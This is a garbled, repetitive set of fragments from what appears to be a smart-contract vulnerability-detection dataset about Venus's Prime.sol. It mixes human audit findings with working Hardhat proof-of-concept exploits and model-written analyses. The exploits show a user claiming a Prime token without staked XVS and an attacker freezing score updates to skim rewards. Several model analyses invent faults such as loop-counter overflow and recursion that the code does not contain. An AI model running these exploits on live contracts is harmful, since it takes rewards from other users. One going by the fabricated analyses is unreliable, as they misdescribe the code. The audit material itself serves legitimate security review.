This happens when the user `claim` a revocable token and when he is `issue` a revocable token, but it does not happen when a user is `issue` an irrevocable token.\n\nThis is `issue()`\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    // We don't reset here.\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                }\n\n                unchecked {\n                    i++;\n                }\n            }\n        } else {\n            for (uint256 i = 0; i < users.length; ) {\n                _mint(false, users[i]);\n                _initializeMarkets(users[i]);\n                \n                // We reset stakedAt here\n                delete stakedAt[users[i]];\n\n                unchecked {\n                    i++;\n                }\n            }\n        }\n    }\n```\nWe can see that when a revocable token is issued and minted the user's `stakedAt` is reset to 0. Whenever a user's token is upgraded, his `stakedAt` has already been reset to 0 inside `claim`.\n\n```javascript\nfunction claim() external {\n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n        \n        // We reset stakedAt here\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n```\n\nThe is only one time when we don't reset the user's `stakedAt` and it's when he is issued an irrevocable token.\n\nLet's see an example and see why this is a problem:\n1. Alice deposits 10k XVS.\n2. The protocol/DAO/admin decides to issue Alice an irrevocable prime token, because she deposited such a large amount of tokens. Keep in mind that the 90 day staking period still hasn't passed and her `stakedAt` is the original time that she deposited 10k XVS.\n3. Time passes and Alice decides to withdraw her entire XVS, so now she has 0 XVS. Her token isn't burned as she has an irrevocable token.\n4. Even more time passes and the protocol/DAO/admin decides to burn Alice's irrevocable token because she is inactive.\n5. EVEN more time passes and Alice returns to the protocol and instead of depositing anything, she calls `claim`.\nHer tx goes through, since her `stakedAt` wasn't reset to 0 when she got issued her irrevocable token.\n\nThis way, Alice claimed a revocable token without having any XVS staked in the contract.\n\n\n## Proof of Concept\nAdd the following line at the top of `tests/hardhat/Prime/Prime.ts`. We'll use this to simulate time passing\n```javascript\nimport { time } from \"@nomicfoundation/hardhat-network-helpers\";\n```\n\nPaste the following inside `tests/hardhat/Prime/Prime.ts` and run `npx hardhat test tests/hardhat/Prime/Prime.ts`.\n```javascript\nit.only(\"User can get Prime token without any XVS staked\", async () => {\n      // User1 deposits 10k XVS\n      await xvs.transfer(await user1.getAddress(), parseUnits(\"10000\", 18));\n      await xvs.connect(user1).approve(xvsVault.address, parseUnits(\"10000\", 18));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, parseUnits(\"10000\", 18));\n      let userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.amount).to.eq(parseUnits(\"10000\", 18));\n\n      // Venus decides to issue an irrevocable Prime token to User1 for staking such a large amount.\n      // Note that the 90 day staking period still hasn't passed\n      await prime.issue(true, [user1.getAddress()]);\n      let token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(true);\n\n      // User1 withdraws her entire balance XVS\n      await xvsVault.connect(user1).requestWithdrawal(xvs.address, 0, parseUnits(\"10000\", 18));\n      userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.pendingWithdrawals).to.eq(parseUnits(\"10000\", 18));\n\n      // User1's Prime token gets burned by protocol\n      await prime.burn(user1.getAddress());\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(false);\n      expect(token.isIrrevocable).to.be.equal(false);\n\n      // 100 days pass\n      await time.increase(8640000);\n\n      // User1 can claim a revocable Prime token without any XVS staked, because his stakedAt wasn't reset to 0\n      expect(prime.stakedAt(await user1.getAddress())).to.not.be.equal(0);\n\n      await prime.connect(user1).claim();\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(false);\n    });\n```\n\n\nIf you are having trouble running the test, this change might fix it. Inside `Prime.sol`, `burn()` remove the access control from the function. This doesn't change the attack and the test outcome.\n```javascript\nfunction burn(address user) external {\n        // _checkAccessAllowed(\"burn(address)\");\n        _burn(user);\n    }\n```\n\n\n## Tools Used\nManual review\nHardhat\n\n## Recommended Mitigation Steps\nReset the user's `stakedAt` whenever he is issued an irrevocable token.\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                    delete stakedAt[users[i]]; \n                }\n          ...\n\n```\n\n\n## Assessed type\n\nOther",

                "decompose": "  Based on the given vulnerability knowledge, we can identify several potential vulnerabilities in the smart contract code. Here are some of them:\n\n1. **Insecure Direct Object References (IDOR)**: The `issue` function takes an array of addresses as a parameter and uses those addresses to mint new tokens and initialize markets for each address. However, there is no validation performed on the input data before using it in the smart contract logic. This means that malicious users could potentially manipulate the addresses being passed into the function to access unauthorized data or perform actions as if they were a legitimate user with higher privileges.\n2. **Privilege escalation**: The `issue` function uses the `_mint` and `_initializeMarkets` functions internally, which could potentially be vulnerable to privilege escalation attacks. These functions are not properly validated, which means that malicious users could potentially exploit them to gain unauthorized access to sensitive data or perform actions as if they were a legitimate user with higher privileges.\n3. **Unchecked arithmetic operations**: The `issue` function uses the `unchecked { i++ }` statement, which is not recommended in Solidity. This could potentially lead to integer overflows or underflows, which could result in unexpected behavior or even exploitable vulnerabilities.\n4. **Lack of secure design patterns**: The `issue` function does not use secure design patterns such as token transfer maps or other secure constructs to handle sensitive data. Instead, it uses direct object references and manipulates them directly within the smart contract logic. This could potentially lead to a vulnerability if the input data is not properly validated and sanitized.\n\nOverall, we can conclude that the given smart contract code is likely vulnerable to several potential vulnerabilities, including IDOR, privilege escalation, unchecked arithmetic operations, and lack of secure design patterns. It is recommended to review the code thoroughly and implement appropriate security measures to mitigate these vulnerabilities.",

The `issue` function takes an `address[]` as a parameter and performs actions based on the length of that array without checking whether the caller has permission to access those addresses. This allows attackers to manipulate the length of the array to access unauthorized data or perform actions as if they were legitimate users with higher privileges.\n2. The function also uses `unchecked` blocks to iterate through the address array, which can lead to integer overflows or other issues if the array is manipulated by an attacker.\n3. Additionally, the `_mint` and `_initializeMarkets` functions are not properly authenticated, allowing unauthorized users to mint new tokens or access sensitive data.\n\nTo mitigate this vulnerability, developers should implement access control checks that verify whether the caller has permission to perform actions on specific addresses. This can be done by creating a mapping of authorized addresses and checking whether the calling address is in that mapping before performing any actions. Additionally, the use of `unchecked` blocks can be avoided by using safer methods for iterating through arrays.",

                "decompose": "  Yes, the given smart contract code is vulnerable to the \"Incorrectly updating user staked amounts during unstaking\" vulnerability. The reason for this vulnerability is that there is no proper validation of the `users` array passed as an argument in the `issue(bool isIrrevocable, address[] calldata users)` function.\n\nThe function first checks whether the current caller has sufficient access rights to issue new tokens using the `_checkAccessAllowed(\"issue(bool,address[])\")` function. If the caller does not have sufficient access, the function throws an exception.\n\nIf the `isIrrevocable` parameter is set to true, the function iterates over each address in the `users` array and checks whether the corresponding token already exists and is irrevocable using the `tokens[users[i]].exists && !tokens[users[i]].isIrrevocable` expression. If the token does not exist or is not irrevocable, the function calls the `_upgrade(users[i])` function to upgrade the token to a new version.\n\nIf the `isIrrevocable` parameter is set to false, the function iterates over each address in the `users` array and checks whether the corresponding token exists using the `tokens[users[i]].exists` expression. If the token does not exist, the function calls the `_mint(false, users[i])` function to mint a new token for the given user.\n\nThe vulnerability lies in the fact that there is no validation of the `users` array passed as an argument in the `issue(bool isIrrevocable, address[] calldata users)` function. An attacker can pass an invalid or malicious `users` array, which can cause the `_mint(false, users[i])` function to mint tokens for non-existent addresses.\n\nAdditionally, there are other vulnerabilities in the given smart contract code that could be exploited to drain funds from the system. For example, the `_checkAccessAllowed(\"issue(bool,address[])\")` function does not properly validate the caller's access rights, which can lead to unauthorized token issuance and distribution.

This creates a recursive call cycle where the `issue` function keeps calling itself with different parameters, leading to unbounded recursion.\n\nTo exploit this vulnerability, an attacker can send a transaction that triggers the `issue` function and causes the `_initializeMarkets` function to be called repeatedly. The attacker can control the input parameters to the `issue` function, such as the `isIrrevocable` flag, which affects the behavior of the function and potentially allows for unbounded recursion.\n\nTo patch this vulnerability, we would need to ensure that the `_initializeMarkets` function is not called repeatedly within the `issue` function. One possible way to do this is to add a check within the `issue` function to see if the user's token has already been initialized and skip calling the `_initializeMarkets` function if it has.\n\nHere is an example of how the patched code might look:\n```solidity\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n    _checkAccessAllowed(\"issue(bool,address[])\");\n\n    for (uint256 i = 0; i < users.length; ) {\n        Token storage userToken = tokens[users[i]];\n        if (userToken.exists && !userToken.isIrrevocable) {\n            _upgrade(users[i]);\n        } else {\n            _mint(true, users[i]);\n            // Check if the token has already been initialized\n            if (!userToken.initialized) {\n                _initializeMarkets(users[i]);\n            }\n        }\n\n        unchecked {\n            i++;\n        }\n    }\n}\n```",

This happens when the user `claim` a revocable token and when he is `issue` a revocable token, but it does not happen when a user is `issue` an irrevocable token.\n\nThis is `issue()`\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    // We don't reset here.\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                }\n\n                unchecked {\n                    i++;\n                }\n            }\n        } else {\n            for (uint256 i = 0; i < users.length; ) {\n                _mint(false, users[i]);\n                _initializeMarkets(users[i]);\n                \n                // We reset stakedAt here\n                delete stakedAt[users[i]];\n\n                unchecked {\n                    i++;\n                }\n            }\n        }\n    }\n```\nWe can see that when a revocable token is issued and minted the user's `stakedAt` is reset to 0. Whenever a user's token is upgraded, his `stakedAt` has already been reset to 0 inside `claim`.\n\n```javascript\nfunction claim() external {\n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n        \n        // We reset stakedAt here\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n```\n\nThe is only one time when we don't reset the user's `stakedAt` and it's when he is issued an irrevocable token.\n\nLet's see an example and see why this is a problem:\n1. Alice deposits 10k XVS.\n2. The protocol/DAO/admin decides to issue Alice an irrevocable prime token, because she deposited such a large amount of tokens. Keep in mind that the 90 day staking period still hasn't passed and her `stakedAt` is the original time that she deposited 10k XVS.\n3. Time passes and Alice decides to withdraw her entire XVS, so now she has 0 XVS. Her token isn't burned as she has an irrevocable token.\n4. Even more time passes and the protocol/DAO/admin decides to burn Alice's irrevocable token because she is inactive.\n5. EVEN more time passes and Alice returns to the protocol and instead of depositing anything, she calls `claim`.\nHer tx goes through, since her `stakedAt` wasn't reset to 0 when she got issued her irrevocable token.\n\nThis way, Alice claimed a revocable token without having any XVS staked in the contract.\n\n\n## Proof of Concept\nAdd the following line at the top of `tests/hardhat/Prime/Prime.ts`. We'll use this to simulate time passing\n```javascript\nimport { time } from \"@nomicfoundation/hardhat-network-helpers\";\n```\n\nPaste the following inside `tests/hardhat/Prime/Prime.ts` and run `npx hardhat test tests/hardhat/Prime/Prime.ts`.\n```javascript\nit.only(\"User can get Prime token without any XVS staked\", async () => {\n      // User1 deposits 10k XVS\n      await xvs.transfer(await user1.getAddress(), parseUnits(\"10000\", 18));\n      await xvs.connect(user1).approve(xvsVault.address, parseUnits(\"10000\", 18));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, parseUnits(\"10000\", 18));\n      let userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.amount).to.eq(parseUnits(\"10000\", 18));\n\n      // Venus decides to issue an irrevocable Prime token to User1 for staking such a large amount.\n      // Note that the 90 day staking period still hasn't passed\n      await prime.issue(true, [user1.getAddress()]);\n      let token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(true);\n\n      // User1 withdraws her entire balance XVS\n      await xvsVault.connect(user1).requestWithdrawal(xvs.address, 0, parseUnits(\"10000\", 18));\n      userInfo = await xvsVault.getUserInfo(xvs.address, 0, user1.getAddress());\n      expect(userInfo.pendingWithdrawals).to.eq(parseUnits(\"10000\", 18));\n\n      // User1's Prime token gets burned by protocol\n      await prime.burn(user1.getAddress());\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(false);\n      expect(token.isIrrevocable).to.be.equal(false);\n\n      // 100 days pass\n      await time.increase(8640000);\n\n      // User1 can claim a revocable Prime token without any XVS staked, because his stakedAt wasn't reset to 0\n      expect(prime.stakedAt(await user1.getAddress())).to.not.be.equal(0);\n\n      await prime.connect(user1).claim();\n      token = await prime.tokens(user1.getAddress());\n      expect(token.exists).to.be.equal(true);\n      expect(token.isIrrevocable).to.be.equal(false);\n    });\n```\n\n\nIf you are having trouble running the test, this change might fix it. Inside `Prime.sol`, `burn()` remove the access control from the function. This doesn't change the attack and the test outcome.\n```javascript\nfunction burn(address user) external {\n        // _checkAccessAllowed(\"burn(address)\");\n        _burn(user);\n    }\n```\n\n\n## Tools Used\nManual review\nHardhat\n\n## Recommended Mitigation Steps\nReset the user's `stakedAt` whenever he is issued an irrevocable token.\n```javascript\nfunction issue(bool isIrrevocable, address[] calldata users) external {\n        _checkAccessAllowed(\"issue(bool,address[])\");\n\n        if (isIrrevocable) {\n            for (uint256 i = 0; i < users.length; ) {\n                Token storage userToken = tokens[users[i]];\n                if (userToken.exists && !userToken.isIrrevocable) {\n                    _upgrade(users[i]);\n                } else {\n                    _mint(true, users[i]);\n                    _initializeMarkets(users[i]);\n                    delete stakedAt[users[i]]; \n                }\n          ...\n\n```\n\n\n## Assessed type\n\nOther",

        "gt": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$.

        "gt": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other 